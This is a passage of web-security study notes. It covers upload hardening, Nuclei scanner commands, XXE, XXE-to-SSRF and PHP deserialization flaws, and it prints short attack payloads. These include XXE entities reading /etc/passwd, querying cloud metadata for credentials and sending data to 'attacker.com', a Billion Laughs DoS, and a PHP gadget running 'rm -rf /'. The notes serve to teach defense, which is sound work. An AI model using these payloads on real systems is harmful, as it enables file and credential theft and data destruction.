      - Use both file extension and MIME type validation.
      - Example: Allow only `.jpg`, `.png`, and `.pdf` files.
    2. **Use Allowlists**:
      - Restrict uploads to a predefined list of allowed file types and extensions.
    3. **Scan Files for Malware**:
      - Use antivirus software to scan uploaded files for malicious content.
    4. **Rename Uploaded Files**:
      - Generate random filenames for uploaded files to prevent overwriting or path traversal.
    5. **Store Files Outside the Web Root**:
      - Store uploaded files in a directory that is not directly accessible via the web.
    6. **Limit File Size**:
      - Set a maximum file size to prevent DoS attacks.
    7. **Use Secure File Permissions**:
      - Ensure uploaded files have restricted permissions (e.g., `644`).
    8. **Disable Execution**:
      - Configure the server to prevent execution of uploaded files (e.g., disable PHP execution in upload directories).
    9. **Use Content Security Policies (CSP)**:
        - Restrict the types of content that can be loaded or executed.

### 4.Nuclei
  - is a fast, customizable, and open-source vulnerability scanner designed to automate the process of detecting security issues in web applications, networks, and infrastructure.
  - It is developed by **ProjectDiscovery** and is widely used by security professionals for its simplicity, flexibility, and extensive template library.


  #### Common Use Cases for Nuclei:
    1. **Web Application Scanning**:
      - Detect vulnerabilities like XSS, SQLi, SSRF, and more in web apps.
    2. **Network Scanning**:
      - Identify misconfigurations or exposed services in network infrastructure.
    3. **Cloud Infrastructure Scanning**:
      - Find misconfigured cloud resources (e.g., S3 buckets, exposed APIs).
    4. **API Security Testing**:
      - Test APIs for vulnerabilities like insecure endpoints or data leaks.
    5. **Custom Vulnerability Detection**:
      - Create custom templates to detect specific issues unique to your environment.

  #### Basic Usage:
    1. **Scan a Single Target**:
      ```bash
      nuclei -u https://example.com
      ```
    2. **Scan Multiple Targets**:
      ```bash
      nuclei -l targets.txt
      ```
    3. **Use Specific Templates**:
      ```bash
      nuclei -u https://example.com -t cves/ -t misconfigurations/
      ```
    4. **Update Templates**:
      ```bash
      nuclei -update-templates
      ```
    5. **Save Results**:
      ```bash
      nuclei -u https://example.com -o results.txt
      ```

  #### Example Scans:
    1. **Detect Exposed Admin Panels**:
      ```bash
      nuclei -u https://example.com -t exposed-panels/
      ```
    2. **Check for Common CVEs**:
      ```bash
      nuclei -u https://example.com -t cves/
      ```
    3. **Scan for Misconfigurations**:
      ```bash
      nuclei -u https://example.com -t misconfigurations/
      ```


## Week 5 (15)

### 1.XXE (XML External Entity)
- is a security vulnerability that occurs when an application processes XML input without properly disabling external entity references. 
- This allows attackers to exploit XML parsers to read sensitive files, perform server-side request forgery (SSRF), or execute arbitrary code.


#### How XXE Works:
1. **XML External Entities**:
    - XML allows the definition of custom entities, which can reference external resources (e.g., files, URLs).
    - Example:
      ```xml
      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
      <foo>&xxe;</foo>
      ```

2. **Exploitation**:
    - An attacker injects malicious XML with external entity references into the application.
    - The XML parser processes the input and resolves the external entities, leading to unintended behavior.


#### Common XXE Attack Scenarios:
  1. **File Disclosure**:
    - Read sensitive files on the server (e.g., `/etc/passwd`, configuration files).
    - Example:
      ```xml
      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
      <foo>&xxe;</foo>
      ```
  2. **Server-Side Request Forgery (SSRF)**:
    - Make the server send requests to internal or external systems.
    - Example:
      ```xml
      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-service/"> ]>
      <foo>&xxe;</foo>
      ```
  3. **Denial of Service (DoS)**:
    - Exploit entity expansion to consume server resources (e.g., Billion Laughs attack).
    - Example:
      ```xml
      <!DOCTYPE foo [
        <!ENTITY lol "lol">
        <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
      ]>
      <foo>&lol3;</foo>
      ```
  4. **Remote Code Execution (RCE)**:
    - In some cases, XXE can lead to RCE if the XML parser supports dangerous features (e.g., PHP expect module).


### 2.XXE+SSRF

  - Combining *XXE (XML External Entity)* and *SSRF (Server-Side Request Forgery)* can lead to powerful attacks where an attacker leverages XXE to trigger SSRF.
  - This allows the attacker to make the server perform unauthorized requests to internal or external systems, potentially accessing sensitive data or exploiting internal services.


#### How XXE and SSRF Work Together:
  1. **XXE for SSRF**:
    - An attacker injects malicious XML with an external entity that references an internal or external URL.
    - The XML parser resolves the entity and makes a request to the specified URL.

  2. **Impact**:
    - Access to internal services (e.g., databases, APIs).
    - Data exfiltration (e.g., fetching sensitive files or metadata).
    - Exploitation of internal systems (e.g., cloud metadata services).

#### Example Attack Scenario:
  1. **Exploiting Cloud Metadata Services**:
    - In cloud environments (e.g., AWS, Azure), metadata services (e.g., AWS EC2 metadata service at `http://169.254.169.254`) can be accessed to retrieve sensitive information like IAM credentials.
    - Example XXE Payload:
      ```xml
      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
      <foo>&xxe;</foo>
      ```
    - The server makes a request to the metadata service and returns the response.

  2. **Accessing Internal APIs**:
    - An attacker can use XXE to access internal APIs that are not exposed to the public.
    - Example XXE Payload:
      ```xml
      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-api/admin"> ]>
      <foo>&xxe;</foo>
      ```

  3. **Exfiltrating Data**:
    - An attacker can exfiltrate data by making the server send requests to an attacker-controlled server.
    - Example XXE Payload:
      ```xml
      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/?data=file:///etc/passwd"> ]>
      <foo>&xxe;</foo>
      ```


### 3.Unserialize Vulnerability
 - is a security issue that occurs when an application deserializes untrusted data without proper validation or sanitization. 
 - This can lead to serious consequences, such as remote code execution (RCE), denial of service (DoS), or data tampering.


#### What is Serialization and Deserialization?
  1. **Serialization**:
    - The process of converting an object or data structure into a format that can be stored or transmitted (e.g., JSON, XML, binary).
    - Example in PHP:
      ```php
      $data = ["username" => "admin", "role" => "superuser"];
      $serialized = serialize($data); // Output: a:2:{s:8:"username";s:5:"admin";s:4:"role";s:9:"superuser";}
      ```

  2. **Deserialization**:
    - The process of converting serialized data back into an object or data structure.
    - Example in PHP:
      ```php
      $serialized = 'a:2:{s:8:"username";s:5:"admin";s:4:"role";s:9:"superuser";}';
      $data = unserialize($serialized); // Output: ["username" => "admin", "role" => "superuser"]
      ```

#### How Unserialize Vulnerabilities Work:
  1. **Untrusted Data**:
    - The application deserializes data from an untrusted source (e.g., user input, cookies, API requests).

  2. **Malicious Payload**:
    - An attacker crafts a malicious serialized payload that, when deserialized, triggers unintended behavior (e.g., executing code, modifying data).

  3. **Exploitation**:
    - The deserialization process reconstructs the malicious object, leading to vulnerabilities like RCE, DoS, or privilege escalation.


#### Common Exploitation Scenarios:
  1. **Remote Code Execution (RCE)**:
    - Attackers inject serialized objects that execute arbitrary code when deserialized.
    - Example in PHP (using `__wakeup` or `__destruct` magic methods):
      ```php
      class Exploit {
          public $command = "rm -rf /";
          public function __destruct() {
              system($this->command);
          }
      }
      $serialized = serialize(new Exploit()); // Malicious payload
      unserialize($serialized); // Executes the command
      ```

  2. **Denial of Service (DoS)**:
    - Attackers craft payloads that consume excessive resources (e.g., infinite loops, large objects).

  3. **Data Tampering**:
    - Attackers modify serialized data to change application behavior (e.g., escalating privileges).

  4. **Object Injection**:
    - Attackers inject unexpected objects into the application, leading to logic flaws or crashes.


#### Prevention Measures:
  1. **Avoid Deserializing Untrusted Data**:
    - Never deserialize data from untrusted sources (e.g., user input, cookies).
  2. **Use Safe Serialization Formats**:
    - Prefer safer formats like JSON or XML for data interchange.
  3. **Validate and Sanitize Input**:
    - Validate and sanitize serialized data before deserialization.
  4. **Use Digital Signatures**:
    - Sign serialized data with a cryptographic signature to ensure integrity.
  5. **Restrict Deserialization**:
    - Use allowlists to restrict which classes or types can be deserialized.
  6. **Patch and Update Libraries**:
    - Regularly update libraries and frameworks to the latest secure versions.
  7. **Use Language-Specific Protections**:
    - In PHP, use `json_encode` and `json_decode` instead of `serialize` and `unserialize`.
    - In Java, use `ObjectInputFilter` to restrict deserialization.

